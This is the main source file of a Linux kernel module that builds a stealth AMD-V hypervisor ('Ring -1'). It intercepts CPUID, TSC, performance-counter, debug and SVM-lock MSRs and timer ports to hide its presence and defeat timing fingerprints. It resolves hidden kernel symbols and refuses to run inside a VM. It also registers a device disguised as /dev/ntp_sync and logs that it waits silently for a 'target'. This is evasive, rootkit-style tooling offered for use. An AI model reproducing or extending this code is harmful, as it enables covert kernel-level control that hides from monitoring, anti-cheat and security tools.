/*
 * main.c — Module Init/Exit + VMCB Prepare (V6.7 Stealth)
 */

#include "ring_minus_one.h"
#include "svm_trace.h"
#include <asm/cpufeature.h>
#include <linux/cpumask.h>
#include <linux/delay.h>
#include <linux/kallsyms.h>
#include <linux/kthread.h>
#include <linux/sched.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Hakan");
MODULE_DESCRIPTION("AMD-V SVM Ring -1 Unified Engine V4.0");
MODULE_IMPORT_NS("KVM_AMD");

/* ═══════════════════════════════════════════════════════════════════════════
 *  Singleton Contexts (Local to main.c, passed explicitly to others or via ptr)
 * ═══════════════════════════════════════════════════════════════════════════
 */

static struct svm_context svm_ctx = {0};
static struct snap_context snap_ctx;

/* Removed: guest_kthread loop */

struct svm_context *g_svm = &svm_ctx;
struct snap_context *g_snap = &snap_ctx;

/* ═══════════════════════════════════════════════════════════════════════════
 *  VMCB Prepare — V4.0 Stealth Intercepts
 * ═══════════════════════════════════════════════════════════════════════════
 */

/*
 * vmcb_prepare_npt - VMCB'yi NPT tabanlı çalışma için yapılandır
 * @vmcb: yapılandırılacak VMCB (çağıran tahsis eder)
 * @g_rip: başlangıç guest instruction pointer
 * @g_rsp: başlangıç guest stack pointer
 * @g_cr3: guest CR3 (0 = mevcut host CR3 kullan)
 * @npt: NPT context (NULL = NPT devre dışı)
 *
 * V4.0 Stealth: CPUID intercept, per-CPU TSC, ASID-only TLB,
 * full timer I/O coverage, expanded MSR intercepts.
 */
int vmcb_prepare_npt(struct svm_context *ctx, u64 g_rip, u64 g_rsp, u64 g_cr3) {
  struct vmcb *vmcb = ctx->vmcb;
  struct npt_context *npt = &ctx->npt;
  u64 efer_val, cr0, cr4, rflags;
  unsigned long cr3;
  u16 cs, ds, ss, es, fs, gs, tr;
  struct desc_ptr gdtr, idtr;
  u64 fs_base, gs_base;

  memset(vmcb, 0, sizeof(*vmcb));

  /* Read host state */
  rdmsrl(MSR_EFER, efer_val);
  cr0 = native_read_cr0();
  asm volatile("mov %%cr3, %0" : "=r"(cr3));
  cr4 = native_read_cr4();
  asm volatile("pushf; pop %0" : "=r"(rflags));

  asm volatile("mov %%cs, %0" : "=r"(cs));
  asm volatile("mov %%ds, %0" : "=r"(ds));
  asm volatile("mov %%ss, %0" : "=r"(ss));
  asm volatile("mov %%es, %0" : "=r"(es));
  asm volatile("mov %%fs, %0" : "=r"(fs));
  asm volatile("mov %%gs, %0" : "=r"(gs));
  asm volatile("str  %0" : "=r"(tr));
  asm volatile("sgdt %0" : "=m"(gdtr));
  asm volatile("sidt %0" : "=m"(idtr));
  rdmsrl(MSR_FS_BASE, fs_base);
  rdmsrl(MSR_GS_BASE, gs_base);

  /* ── Intercepts ── */

  /* VMRUN (mandatory) */
  vmcb->control.intercepts[INTERCEPT_VMRUN >> 5] |=
      (1U << (INTERCEPT_VMRUN & 31));
  /* HLT */
  vmcb->control.intercepts[INTERCEPT_HLT >> 5] |= (1U << (INTERCEPT_HLT & 31));
  /* CPUID — uniform latency, prevent timing fingerprint */
  vmcb->control.intercepts[INTERCEPT_CPUID >> 5] |=
      (1U << (INTERCEPT_CPUID & 31));

  /* MSR and IO interception (mandatory for MSRPM/IOPM usage) */
  vmcb->control.intercepts[INTERCEPT_MSR_PROT >> 5] |=
      (1U << (INTERCEPT_MSR_PROT & 31));
  vmcb->control.intercepts[INTERCEPT_IOIO_PROT >> 5] |=
      (1U << (INTERCEPT_IOIO_PROT & 31));

  /* RDTSCP */
#ifdef INTERCEPT_RDTSCP
  vmcb->control.intercepts[INTERCEPT_RDTSCP >> 5] |=
      (1U << (INTERCEPT_RDTSCP & 31));
#endif

  /* ── MSRPM V4.0: Full timing + syscall MSR coverage ── */
  if (ctx->msrpm_va) {
    u8 *msrpm = (u8 *)ctx->msrpm_va;

    /* MSR 0x10 (IA32_TSC): rdmsr */
    msrpm[(0x10 * 2) / 8] |= (1 << ((0x10 * 2) % 8));
    /* MSR 0xE7 (IA32_MPERF): rdmsr — CPU freq detection */
    msrpm[(0xE7 * 2) / 8] |= (1 << ((0xE7 * 2) % 8));
    /* MSR 0xE8 (IA32_APERF): rdmsr — CPU freq detection */
    msrpm[(0xE8 * 2) / 8] |= (1 << ((0xE8 * 2) % 8));
    /* MSR 0x176 (IA32_SYSENTER_EIP): rdmsr */
    msrpm[(0x176 * 2) / 8] |= (1 << ((0x176 * 2) % 8));

    /* AMD Zen 4 MSRPM Change: First block is now 32KB (0x8000), not 2KB (0x800)
     */
    /* MSR 0xC0000081 (STAR): rdmsr + wrmsr */
    msrpm[0x8000 + (0x81 * 2) / 8] |= (3 << ((0x81 * 2) % 8));
    /* MSR 0xC0000082 (LSTAR): rdmsr + wrmsr */
    msrpm[0x8000 + (0x82 * 2) / 8] |= (3 << ((0x82 * 2) % 8));
    /* MSR 0xC0000103 (TSC_AUX): rdmsr */
    msrpm[0x8000 + (0x103 * 2) / 8] |= (1 << ((0x103 * 2) % 8));

    /* MSR 0xC0010015 (K8_HWCR): rdmsr — SVME_LOCK spoofing */
    msrpm[0x8800 + (0x15 * 2) / 8] |= (1 << ((0x15 * 2) % 8));

    /* MSR 0xC0010114 (SVM_LOCK_KEY): rdmsr — SVM presence hiding */
    msrpm[0x8800 + (0x114 * 2) / 8] |= (1 << ((0x114 * 2) % 8));

    /* ── PMC MSRs: intercept to freeze counters ── */
    /* MSR 0x38D (IA32_PERF_FIXED_CTR_CTRL): rdmsr+wrmsr */
    msrpm[(0x38D * 2) / 8] |= (3 << ((0x38D * 2) % 8));
    /* MSR 0x38F (IA32_PERF_GLOBAL_CTRL): rdmsr+wrmsr */
    msrpm[(0x38F * 2) / 8] |= (3 << ((0x38F * 2) % 8));
    /* MSR 0x309 (IA32_FIXED_CTR0): rdmsr */
    msrpm[(0x309 * 2) / 8] |= (1 << ((0x309 * 2) % 8));
    /* MSR 0x30A (IA32_FIXED_CTR1): rdmsr */
    msrpm[(0x30A * 2) / 8] |= (1 << ((0x30A * 2) % 8));
    /* MSR 0x30B (IA32_FIXED_CTR2): rdmsr */
    msrpm[(0x30B * 2) / 8] |= (1 << ((0x30B * 2) % 8));

    /* ── BTS: IA32_DEBUGCTL (0x1D9) — block Branch Trace Store ── */
    msrpm[(0x1D9 * 2) / 8] |= (3 << ((0x1D9 * 2) % 8));
  }

  /* ── IOPM: Timer I/O port coverage ── */
  if (ctx->iopm_va) {
    u8 *iopm = (u8 *)ctx->iopm_va;

    /* PIT: 0x40-0x43 */
    iopm[0x40 / 8] |= (1 << (0x40 % 8));
    iopm[0x41 / 8] |= (1 << (0x41 % 8));
    iopm[0x42 / 8] |= (1 << (0x42 % 8));
    iopm[0x43 / 8] |= (1 << (0x43 % 8));
    /* ACPI PM Timer: 0x808-0x80B */
    iopm[0x808 / 8] |= (1 << (0x808 % 8));
    iopm[0x809 / 8] |= (1 << (0x809 % 8));
    iopm[0x80A / 8] |= (1 << (0x80A % 8));
    iopm[0x80B / 8] |= (1 << (0x80B % 8));
  }

  vmcb->control.msrpm_base_pa = ctx->msrpm_pa;
  vmcb->control.iopm_base_pa = ctx->iopm_pa;

  /* ASID-only isolation, no TLB flush penalty */
  vmcb->control.asid = 2;
  vmcb->control.tlb_ctl = 0;

  vmcb->control.virt_ext |= LBR_CTL_ENABLE_MASK; // LBR Bleed Koruması!

  /* First VMRUN: clean=0 forces full load. Subsequent runs use STABLE. */
  vmcb->control.clean = 0;

  /* NPT configuration */
  if (npt && npt->pml4_pa && pfn_valid(npt->pml4_pa >> PAGE_SHIFT)) {
    vmcb->control.nested_ctl = 1;
    vmcb->control.nested_cr3 = npt->pml4_pa;
    pr_info("[VMCB] NPT enabled, nested_cr3=0x%llx\n", (u64)npt->pml4_pa);
  } else {
    pr_err("[VMCB] CRITICAL: Invalid NPT PML4 %llx. Disabling NPT.\n",
           npt ? (u64)npt->pml4_pa : 0);
    vmcb->control.nested_ctl = 0;
  }

  /* TSC offset — per-CPU */
  vmcb->control.tsc_offset = *this_cpu_ptr(&pcpu_tsc_offset);

  /* ── Segment Registers ── */
  vmcb->save.cs.selector = cs;
  vmcb->save.cs.attrib = 0x029B;
  vmcb->save.cs.limit = 0xFFFFFFFF;
  vmcb->save.cs.base = 0;

  vmcb->save.ds.selector = ds;
  vmcb->save.ds.attrib = 0x0093;
  vmcb->save.ds.limit = 0xFFFFFFFF;
  vmcb->save.ds.base = 0;

  vmcb->save.es.selector = es;
  vmcb->save.es.attrib = 0x0093;
  vmcb->save.es.limit = 0xFFFFFFFF;
  vmcb->save.es.base = 0;

  vmcb->save.ss.selector = ss;
  vmcb->save.ss.attrib = 0x0093;
  vmcb->save.ss.limit = 0xFFFFFFFF;
  vmcb->save.ss.base = 0;

  vmcb->save.fs.selector = fs;
  vmcb->save.fs.attrib = 0x0093;
  vmcb->save.fs.limit = 0xFFFFFFFF;
  vmcb->save.fs.base = fs_base;

  vmcb->save.gs.selector = gs;
  vmcb->save.gs.attrib = 0x0093;
  vmcb->save.gs.limit = 0xFFFFFFFF;
  vmcb->save.gs.base = gs_base;

  vmcb->save.gdtr.limit = gdtr.size;
  vmcb->save.gdtr.base = gdtr.address;
  vmcb->save.idtr.limit = idtr.size;
  vmcb->save.idtr.base = idtr.address;

  vmcb->save.tr.selector = tr;
  vmcb->save.tr.limit = 0xFFFF;
  vmcb->save.tr.attrib = 0x008B;

  /* Güvenlik (Zero-Day Mod): Host TR base'inin GDT üzerinden tam okunması */
  {
    u8 *gdt = (u8 *)gdtr.address;
    u16 idx = tr & ~7;
    u64 tr_base = 0;
    if (gdt) {
      /* FIX: Prevent 32-bit sign extension by casting to u64 before shift */
      tr_base = ((u64)gdt[idx + 2]) | ((u64)gdt[idx + 3] << 8) |
                ((u64)gdt[idx + 4] << 16) | ((u64)gdt[idx + 7] << 24);
      /* 64-bit modunda TSS 16-byte'tır. Üst 32-biti de oku. */
      tr_base |= ((u64)(*(u32 *)(&gdt[idx + 8])) << 32);
    }
    vmcb->save.tr.base = tr_base;
  }

  /* Control registers */
  vmcb->save.cr0 = cr0;
  vmcb->save.cr3 = (g_cr3 && pfn_valid(g_cr3 >> PAGE_SHIFT))
                       ? g_cr3
                       : (cr3 & 0xFFFFFFFFFFFFF000ULL);
  vmcb->save.cr4 = cr4;
  vmcb->save.efer = efer_val;

  /* Debug registers */
  vmcb->save.dr6 = 0xFFFF0FF0;
  vmcb->save.dr7 = 0x00000400;

  /* Execution state */
  vmcb->save.rip = g_rip;
  vmcb->save.rsp = g_rsp;
  vmcb->save.rax = 0;
  vmcb->save.rflags = rflags & ~X86_EFLAGS_IF;

  return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  Module Init — SVM Setup + Test VMRUN + Procfs
 * ═══════════════════════════════════════════════════════════════════════════
 */

static int __init svm_module_init(void) {
  u64 efer_val;
  int ret;
  u32 eax, ebx, ecx, edx;

  /* Phase 3.1: No longer binding entire module init to CPU 0 */

  pr_info("=== SVM Modülü Başlatılıyor ===\n");

  /* 0) KVM (Hypervisor) Varlık Testi */
  cpuid(1, &eax, &ebx, &ecx, &edx);
  if (ecx & (1 << 31)) {
    pr_err("KRITIK HATA: KVM / Sanal Makine Tespit Edildi (CPUID.1:ECX.31 = 1). "
           "Modül sadece Bare-Metal'de çalıştırılabilir. Yükleme iptal edildi!\n");
    return -EBUSY;
  }

  /* 1) SVM desteği kontrol */
  if (!svm_supported()) {
    pr_err("SVM bu CPU'da desteklenmiyor.\n");
    return -ENODEV;
  }
  pr_info("SVM desteği mevcut.\n");

  mutex_init(&snap_ctx.lock);

  /* 1.5) NPT Init */
  ret = npt_build_identity_map(&svm_ctx.npt, 1ULL << 36); /* 64GB */
  if (ret) {
    pr_err("NPT identity map kurulamadi.\n");
    return ret;
  }

  /* 2) Gizli semboller */
  ret = resolve_hidden_symbols();
  if (ret < 0)
    goto err_npt;

  /* 3) EFER.SVME etkinleştir */
  rdmsrl(MSR_EFER, efer_val);
  if (!(efer_val & EFER_SVME)) {
    efer_val |= EFER_SVME;
    wrmsrl(MSR_EFER, efer_val);
    pr_info("SVME biti etkinleştirildi.\n");
  }

  /* 4) HSAVE alanı */
  svm_ctx.hsave_va = (void *)__get_free_page(GFP_KERNEL | __GFP_ZERO);
  if (!svm_ctx.hsave_va) {
    pr_err("HSAVE tahsis hatası.\n");
    ret = -ENOMEM;
    goto err_npt;
  }
  svm_ctx.hsave_pa = virt_to_phys(svm_ctx.hsave_va);
  wrmsrl(MSR_VM_HSAVE_PA, svm_ctx.hsave_pa);

  /* 5) VMCB */
  svm_ctx.vmcb = (struct vmcb *)__get_free_page(GFP_KERNEL | __GFP_ZERO);
  if (!svm_ctx.vmcb) {
    ret = -ENOMEM;
    goto err_hsave;
  }
  svm_ctx.vmcb_pa = virt_to_phys(svm_ctx.vmcb);

  /* 6) MSRPM - 64KB (Zen 4 requires 40KB) */
  svm_ctx.msrpm_va = (void *)__get_free_pages(GFP_KERNEL | __GFP_ZERO, 4);
  if (!svm_ctx.msrpm_va) {
    ret = -ENOMEM;
    goto err_vmcb;
  }
  svm_ctx.msrpm_pa = virt_to_phys(svm_ctx.msrpm_va);

  /* 7) IOPM - 12KB */
  svm_ctx.iopm_va = (void *)__get_free_pages(GFP_KERNEL | __GFP_ZERO, 2);
  if (!svm_ctx.iopm_va) {
    ret = -ENOMEM;
    goto err_msrpm;
  }
  svm_ctx.iopm_pa = virt_to_phys(svm_ctx.iopm_va);

  /* Note: VMCB preparation will now happen dynamically during ioctl
   * inside the context of the user-space process. We do not set up
   * dummy guest static fields here anymore. */
  /* ── Proc entries & Trace Init (MUST BE BEFORE VMRUN) ── */
  ret = procfs_init(&snap_ctx);
  if (ret)
    goto err_msrpm;

  ret = svm_trace_init();
  if (ret) {
    procfs_exit(&snap_ctx);
    goto err_msrpm;
  }

  ret = svm_chardev_init();
  if (ret) {
    svm_trace_cleanup();
    procfs_exit(&snap_ctx);
    goto err_msrpm;
  }

  ret = svm_ghost_init();
  if (ret) {
    svm_chardev_exit();
    svm_trace_cleanup();
    procfs_exit(&snap_ctx);
    goto err_msrpm;
  }

  pr_info(">>> BAŞARILI! Modül arka planda sessizce /dev/ntp_sync üzerinden "
          "hedef bekliyor <<<\n");
  return 0;


err_msrpm:
  if (svm_ctx.msrpm_va) {
    free_pages((unsigned long)svm_ctx.msrpm_va, 4);
    svm_ctx.msrpm_va = NULL;
  }
err_vmcb:
  if (svm_ctx.vmcb) {
    free_page((unsigned long)svm_ctx.vmcb);
    svm_ctx.vmcb = NULL;
  }
err_hsave:
  if (svm_ctx.hsave_va) {
    free_page((unsigned long)svm_ctx.hsave_va);
    svm_ctx.hsave_va = NULL;
  }
err_npt:
  npt_destroy(&svm_ctx.npt);
  return ret;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  Module Exit
 * ═══════════════════════════════════════════════════════════════════════════
 */

static void __exit svm_module_exit(void) {
  u64 efer_val;

  /*
   * Clean-up MUST run on CPU 0 to wipe the correct MSR_VM_HSAVE_PA.
   * If rmmod runs on CPU 2, CPU 0's MSR is left permanently poisoned.
   */
  set_cpus_allowed_ptr(current, cpumask_of(0));

  /* Phase 3.1: No kthread cleanup anymore */

  svm_ghost_exit();
  svm_chardev_exit();
  svm_trace_cleanup();

  /* Procfs + watcher cleanup */
  procfs_exit(&snap_ctx);
  npt_destroy(&svm_ctx.npt);

  /* SVM cleanup */
  rdmsrl(MSR_EFER, efer_val);
  efer_val &= ~EFER_SVME;
  wrmsrl(MSR_EFER, efer_val);

  /* Phase 3.1: No dummy code payload cleanup anymore */
  if (svm_ctx.iopm_va) {
    free_pages((unsigned long)svm_ctx.iopm_va, 2);
    svm_ctx.iopm_va = NULL;
  }
  if (svm_ctx.msrpm_va) {
    free_pages((unsigned long)svm_ctx.msrpm_va, 4);
    svm_ctx.msrpm_va = NULL;
  }
  if (svm_ctx.vmcb) {
    free_page((unsigned long)svm_ctx.vmcb);
    svm_ctx.vmcb = NULL;
  }
  if (svm_ctx.hsave_va) {
    free_page((unsigned long)svm_ctx.hsave_va);
    svm_ctx.hsave_va = NULL;
  }

  pr_info("SVM modülü temizlendi.\n");
}

module_init(svm_module_init);
module_exit(svm_module_exit);
